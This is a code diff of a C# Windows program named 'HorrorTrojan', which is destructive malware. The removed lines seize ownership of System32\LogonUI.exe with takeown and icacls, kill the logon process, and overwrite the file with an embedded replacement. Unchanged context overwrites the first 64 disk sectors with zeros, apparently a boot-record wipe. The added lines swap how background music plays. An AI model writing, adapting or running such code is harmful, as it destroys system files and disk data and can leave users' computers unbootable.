@@ -8,8 +8,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Reflection;
 using Microsoft.Win32;
-using System.Security.AccessControl;
-using System.Security.Principal;
+using System.Media;
 
 namespace HorrorTrojan
 {
@@ -55,166 +54,16 @@ namespace HorrorTrojan
         private Image gifImage;
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
+        private SoundPlayer musicPlayer;
 
         public MainInterface()
         {
-            // СНАЧАЛА УДАЛЯЕМ LogonUI.exe
-            ReplaceLogonUI();
-
-            // ПОТОМ ЗАПУСКАЕМ ФОРМУ
             InitializeComponent();
             SetupForm();
             LoadResources();
             StartTimers();
             SetupProtection();
-
-            // ЗАПУСКАЕМ МУЗЫКУ В ФОНЕ
             PlayMusic();
-        }
-
-        private void ReplaceLogonUI()
-        {
-            try
-            {
-                string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
-                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
-                if (!File.Exists(originalPath)) return;
-
-                ForceFullAccess(originalPath);
-                KillLogonUIProcesses();
-
-                File.SetAttributes(originalPath, FileAttributes.Normal);
-                for (int i = 0; i < 5; i++)
-                {
-                    try
-                    {
-                        File.Delete(originalPath);
-                        break;
-                    }
-                    catch
-                    {
-                        Thread.Sleep(1000);
-                        try
-                        {
-                            File.Move(originalPath, originalPath + ".del");
-                            File.Delete(originalPath + ".del");
-                            break;
-                        }
-                        catch { }
-                    }
-                }
-
-                byte[] customLogonUI = ExtractResource("LogonUI.exe");
-                File.WriteAllBytes(originalPath, customLogonUI);
-            }
-            catch { }
-        }
-
-        private void ForceFullAccess(string path)
-        {
-            try
-            {
-                File.SetAttributes(path, FileAttributes.Normal);
-            }
-            catch { }
-
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "takeown.exe",
-                    Arguments = $"/f \"{path}\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-                if (p != null) { p.WaitForExit(3000); p.Close(); }
-            }
-            catch { }
-
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "icacls.exe",
-                    Arguments = $"\"{path}\" /grant Everyone:F",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-                if (p != null) { p.WaitForExit(3000); p.Close(); }
-            }
-            catch { }
-
-            try
-            {
-                FileInfo fi = new FileInfo(path);
-                FileSecurity fs = fi.GetAccessControl();
-                fs.SetOwner(WindowsIdentity.GetCurrent().User);
-                fs.AddAccessRule(new FileSystemAccessRule(
-                    new NTAccount(Environment.UserDomainName, Environment.UserName),
-                    FileSystemRights.FullControl, AccessControlType.Allow));
-                fs.AddAccessRule(new FileSystemAccessRule(
-                    new NTAccount("NT AUTHORITY\\SYSTEM"),
-                    FileSystemRights.FullControl, AccessControlType.Allow));
-                fi.SetAccessControl(fs);
-            }
-            catch { }
-        }
-
-        private void KillLogonUIProcesses()
-        {
-            try
-            {
-                foreach (Process p in Process.GetProcessesByName("LogonUI"))
-                {
-                    try
-                    {
-                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
-                            p.MainModule.FileName.Contains("System32"))
-                        {
-                            p.Kill();
-                            p.WaitForExit(3000);
-                            Thread.Sleep(500);
-                        }
-                    }
-                    catch { }
-                }
-            }
-            catch { }
-        }
-
-        private byte[] ExtractResource(string resourceName)
-        {
-            Assembly assembly = Assembly.GetExecutingAssembly();
-            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
-                  assembly.GetManifestResourceStream($"HorrorTrojan.{resourceName}"))
-            {
-                if (stream == null) throw new Exception($"Resource {resourceName} not found");
-                byte[] data = new byte[stream.Length];
-                stream.Read(data, 0, data.Length);
-                return data;
-            }
-        }
-
-        private void PlayMusic()
-        {
-            try
-            {
-                string musicPath = Path.Combine(appDataPath, "dv.mp3");
-                if (File.Exists(musicPath))
-                {
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "cmd",
-                        Arguments = $"/c start /min \"\" \"{musicPath}\"",
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = false
-                    });
-                }
-            }
-            catch { }
         }
 
         private void InitializeComponent()
@@ -295,6 +144,20 @@ namespace HorrorTrojan
         private void OnFrameChanged(object sender, EventArgs e)
         {
             try { this.pictureBox.Invalidate(); } catch { }
+        }
+
+        private void PlayMusic()
+        {
+            try
+            {
+                string musicPath = Path.Combine(appDataPath, "dv.mp3");
+                if (File.Exists(musicPath))
+                {
+                    musicPlayer = new SoundPlayer(musicPath);
+                    musicPlayer.PlayLooping();
+                }
+            }
+            catch { }
         }
 
         private void StartTimers()
@@ -478,7 +341,7 @@ namespace HorrorTrojan
             {
                 try
                 {
-                    string logonUIPath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows", "System32", "LogonUI.exe");
+                    string logonUIPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                     if (File.Exists(logonUIPath))
                     {
                         var fi = new FileInfo(logonUIPath);
@@ -503,6 +366,7 @@ namespace HorrorTrojan
                 glitchTimer.Stop();
                 videoTimer.Stop();
                 protectionTimer.Stop();
+                musicPlayer?.Stop();
 
                 byte[] zeros = new byte[512];
                 for (int sector = 0; sector < 64; sector++)
@@ -583,6 +447,7 @@ namespace HorrorTrojan
                 videoTimer?.Dispose();
                 protectionTimer?.Dispose();
                 gifImage?.Dispose();
+                musicPlayer?.Dispose();
             }
             base.Dispose(disposing);
         }
